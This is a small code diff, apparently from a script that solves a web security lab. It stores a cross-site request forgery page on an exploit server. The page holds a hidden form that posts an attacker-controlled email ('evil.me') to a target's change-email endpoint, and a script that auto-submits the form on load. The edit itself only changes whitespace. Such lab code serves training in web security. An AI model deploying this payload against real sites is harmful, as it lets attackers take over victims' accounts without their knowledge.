@@ -24,12 +24,12 @@ def store_exploit(client, exploit_server, host):
             'responseFile': '/exploit',
             'responseHead': '''HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8''',
-            'responseBody': '''<form action="'''+host+'''/my-account/change-email" method="POST">
+            'responseBody': '''<form action="''' + host + '''/my-account/change-email" method="POST">
       <input type="hidden" name="email" value="email&#64;evil&#46;me" />
       <input type="submit" value="Submit request" />
 </form>
 <script>
-	document.forms[0].submit();
+    document.forms[0].submit();
 </script>''',
             'formAction': 'STORE'}
 
